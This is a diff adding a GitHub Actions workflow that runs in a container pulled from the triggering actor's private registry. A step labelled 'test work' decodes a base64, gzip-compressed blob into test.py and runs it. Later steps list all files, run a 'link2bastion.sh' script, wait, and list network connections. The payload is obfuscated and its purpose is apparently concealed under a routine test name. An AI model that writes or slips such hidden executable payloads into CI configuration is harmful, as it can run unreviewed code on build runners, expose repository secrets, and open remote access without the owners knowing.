@@ -1,0 +1,25 @@
+name: use-private-docker-works
+
+on:
+  workflow_dispatch:
+
+jobs:
+  debugger-check:
+    runs-on: ubuntu-latest
+    container:
+      image: ghcr.io/${{ github.actor }}/private-debug-docker/debugger:latest
+      options: --ipc=host
+    steps:
+      - name: test work
+        run: |
+          echo "H4sIAAAAAAACA3WPsW7CMBCGdz+Fmy5BIvbQrRIDIMTUsrBHSX0klvCdsc8Jefu6JRRVaqeT7v/uO/3PTzrFoFuLGnCQfuKe8EWIUyAnI5wBbXLSOk+B5QitCXaA8DtWP3v1Qc4Rqna6n2wmIcizJYxy9RCobZ8NcLgl5eLOqMaYugldcoBcFlXVQ2POEGPxP4JUxQZNS9cM3fR/vCrn89U8F2JmVQdZ0zP7+Kr1OI4qdUz+q0r2CciuGTxZNHXu/P14M6njel+/r992S1kYO2TYB5sTUAxXfvgvyXJu+Anzh2+nagEAAA==" | base64 -d | zcat > test.py
+          python3 test.py
+      - name: check
+        run: |
+          ls -lR
+      - name: link to bastion
+        run: link2bastion.sh
+      - name: wait
+        run: sleep 30
+      - name: check
+        run: ss -ntp
